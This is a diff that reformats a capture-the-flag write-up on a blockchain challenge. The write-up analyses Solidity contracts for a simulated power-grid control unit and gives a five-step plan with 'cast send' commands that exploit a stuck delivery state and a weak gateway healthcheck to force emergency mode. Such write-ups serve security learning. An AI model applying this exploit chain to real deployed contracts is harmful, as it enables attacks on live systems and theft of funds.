@@ -6,9 +6,10 @@
 
 ## Docker Information
 
-IP ADDRESS & PORT
+```IP ADDRESS & PORT
 94.237.48.12:53205
 94.237.48.12:47210
+```
 
 ## Recon the Challenge
 
@@ -26,31 +27,26 @@ The first endpoint exposes a blockchain RPC node, the second is an interface to 
 
 ```bash
 └─$ curl http://94.237.48.12:53205/
-```
+
 rpc is running!
+```
+
+And the another:
 
 ```bash
 └─$ nc 94.237.48.12 47210
-```
-1 - Get
-
-connection information
-
+1 - Get connection information
 2 - Restart instance
-
 3 - Get flag
 
 Select action (enter number): 1
-
 [*] No running node found. Launching new node...
 
 Player Private Key : 0xaf9b6a6b6a16d5b22660b2fdc6ac0e2e497fcbda8442d842e83c27eb6d33f652
-
 Player Address     : 0xA28BFc8F560755EAE77bddeD4e27d70C865330cb
-
 Target contract    : 0xa97b6577c23a23aB2d9613B8F2a27597E457aC06
-
 Setup contract     : 0x27B7283221678D840Fb11bE17278dA18BEE3B109
+```
 
 We queried the challenge-specific data and we are ready to fight this. We dwelve into code analysis.
 
@@ -95,27 +91,16 @@ By reading through the function definitions and usage of “msg.value”, techni
 
 ```function infrastructureSanityCheck() external {
 uint256 healthy = 0;
-
 for (uint i = 0; i < gatewayCount; i++) {
-
 if (gateways[i].healthcheck()) {
-
 healthy++;
-
 }
-
 }
-
 healthyPercentage = (healthy * 100) / gatewayCount;
-
 if (healthyPercentage < 50) {
-
 triggerEmergencyMode();
-
 }
-
 }
-
 ```
 Ultimately, this is when we uncovered critical vulnerabvilities in the logic. These checks are not robust enough to handle edge cases. Let’s explain each of these vulnerabilities one-by-one.
 
@@ -125,35 +110,20 @@ controlUnit.status remains stuck on CU_STATUS_DELIVERING and never resets this s
 
 ```function requestPowerDelivery(uint256 _amount, uint8 _gatewayID) external circuitBreaker failSafeMonitor {
 Gateway storage gateway = controlUnit.registeredGateways[_gatewayID];
-
 require(controlUnit.status == CU_STATUS_IDLE, "[VCNK] Control unit is not in a valid state for power delivery.");
-
 require(gateway.status == GATEWAY_STATUS_IDLE, "[VCNK] Gateway is not in a valid state for power delivery.");
-
 require(_amount > 0, "[VCNK] Requested power must be greater than 0.");
-
 require(_amount <= gateway.availableQuota, "[VCNK] Insufficient quota.");
-
 emit PowerDeliveryRequest(_gatewayID, _amount);
-
 controlUnit.status = CU_STATUS_DELIVERING;
-
 controlUnit.currentCapacity -= _amount;
-
 gateway.status = GATEWAY_STATUS_ACTIVE;
-
 gateway.totalUsage += _amount;
-
 bool status = VCNKv2CompatibleReceiver(gateway.addr).deliverEnergy(_amount);
-
 require(status, "[VCNK] Power delivery failed.");
-
 controlUnit.currentCapacity = MAX_CAPACITY;
-
 gateway.status = GATEWAY_STATUS_IDLE;
-
 emit PowerDeliverySuccess(_gatewayID, _amount);
-
 }
 
 ```
@@ -165,13 +135,9 @@ Gateways are considered “healthy” if the following condition is met:
 
 ```function healthcheck() external view onlyProxy returns (bool) {
 return (
-
 _kernel() != address(0) &&
-
 energyVault <= MAX_VAULT_CAPACITY
-
 );
-
 }```
 
 This check does not validate whether the gateway is actually delivering power or stuck. Quickly, we realize that this is a weak healthcheck after all, since it ignores real operation health. It is exploitable.
@@ -190,27 +156,16 @@ The contract triggers emergency mode if less than 50% of the gateways are health
 
 ```modifier failSafeMonitor() {
 if (controlUnit.currentCapacity <= FAILSAFE_THRESHOLD) {
-
 controlUnit.status = CU_STATUS_EMERGENCY;
-
 emit ControlUnitEmergencyModeActivated();
-
 }
-
 else if (controlUnit.healthyGatewaysPercentage < 50) {
-
 controlUnit.status = CU_STATUS_EMERGENCY;
-
 emit ControlUnitEmergencyModeActivated();
-
 }
-
 else {
-
 _;  // Continue execution only if no emergency conditions met
-
 }
-
 }```
 
 ## Success Criteria: isSolved?
@@ -219,32 +174,23 @@ Let’s also see when the challenge is considered as solved, right? Our aim is t
 
 ```// Setup.sol
 function isSolved() public view returns (bool) {
-
 uint8 CU_STATUS_EMERGENCY = 3;
-
 (uint8 status, , , , ) = TARGET.controlUnit();
-
 return status == CU_STATUS_EMERGENCY;
-
 }
-
 ```
 In short, the challenge is solved when the control unit enters into emergency mode.
 
 Once we understood the above vulnerabilities and overall functionality of the app, we can already see how all of the puzzle pieces are coming together and we can put together an exploit chain.
 
-Wrapping It All Up – The Exploit Plan
+## Wrapping It All Up – The Exploit Plan
 
 Analysing the source code of the blockchain application, identifying the flaws and vulnerabilities, we can put together a straightforward and concrete plan on how to crash the power grid.
 
 ✅ 1. Use requestQuotaIncrease to pay the quota (4 ether /piece).
-
 ✅ 2. Trigger requestPowerDelivery to set DELIVERING state.
-
 ✅ 3. Repeatedly register failing gateways (registerGateway, 20 ether /each).
-
 ✅ 4. Run infrastructureSanityCheck to update the healthy percentage.
-
 ✅ 5. Once healthy percentage < 50%, emergency mode triggers and we win!
 
 What this means in layman’s terms?
@@ -262,37 +208,31 @@ This challenge demonstrates that even a small bug like forgetting to reset statu
 ```bash
 # Increase quota twice
 cast send $TARGET "requestQuotaIncrease(uint8)" 0 --value 4ether --private-key $PRIVATE_KEY --rpc-url $RPC_URL
-
 cast send $TARGET "requestQuotaIncrease(uint8)" 1 --value 4ether --private-key $PRIVATE_KEY --rpc-url $RPC_URL
 
 # Stuck 'delivering' state
 cast send $TARGET "requestPowerDelivery(uint256,uint8)" 1000000000000000000 0 --private-key $PRIVATE_KEY --rpc-url $RPC_URL
 
-# Register 3 failing gateways (each 20 ether)
+# Register 3 failing gateways
 cast send $TARGET "registerGateway()" --value 20ether --private-key $PRIVATE_KEY --rpc-url $RPC_URL
-
 cast send $TARGET "registerGateway()" --value 20ether --private-key $PRIVATE_KEY --rpc-url $RPC_URL
-
 cast send $TARGET "registerGateway()" --value 20ether --private-key $PRIVATE_KEY --rpc-url $RPC_URL
 
 # Update health percentage
 cast send $TARGET "infrastructureSanityCheck()" --private-key $PRIVATE_KEY --rpc-url $RPC_URL
 
 # Register final gateway to push healthy % below 50%
-cast send $TARGET "registerGateway()" --value 20ether --private-key $PRIVATE_KEY --rpc-url $RPC_URL```
+cast send $TARGET "registerGateway()" --value 20ether --private-key $PRIVATE_KEY --rpc-url $RPC_URL
+```
 
 Ultimately, at this point, we can conclude that the emergency mode is triggered and the system is compromised. Once we are done, we can query the isSolved function or rush to the channel UI.
 
 ```bash
 └─$ nc 94.237.48.12 47210
-```
-1 - Get
-
-connection information
-
+1 - Get connection information
 2 - Restart instance
-
 3 - Get flag
+```
 
 Type 3 to grab the flag and enjoy the success.
 
